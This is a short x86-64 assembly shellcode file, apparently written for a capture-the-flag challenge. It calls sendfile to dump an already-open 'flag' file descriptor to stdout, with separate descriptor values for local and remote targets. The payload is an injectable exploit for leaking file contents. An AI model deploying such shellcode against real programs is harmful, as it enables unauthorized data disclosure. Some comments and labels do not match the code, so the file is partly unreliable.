BITS 64
    GLOBAL _start
section .text

__start:
    xor rax, rax    ; clean
    xor rdi, rdi    ; clean
    xor rsi, rsi    ; clean
    xor rdx, rdx    ; clean offset
    xor r10, r10    ; clean

    ;; sendfile(STDOUT, FLAG_FILE, x, y)
    mov al, 0x28    ; sendfile
    mov dil, 0x1    ; stdout
    
    ; local
    ;mov sil, 0x3    ; flag file fd
    ; remote
    mov sil, 0x5    ; flag
    mov r10b, dil
    shl r10, 8      ; count (4 << 8 = 1024)
    syscall
    ;ret
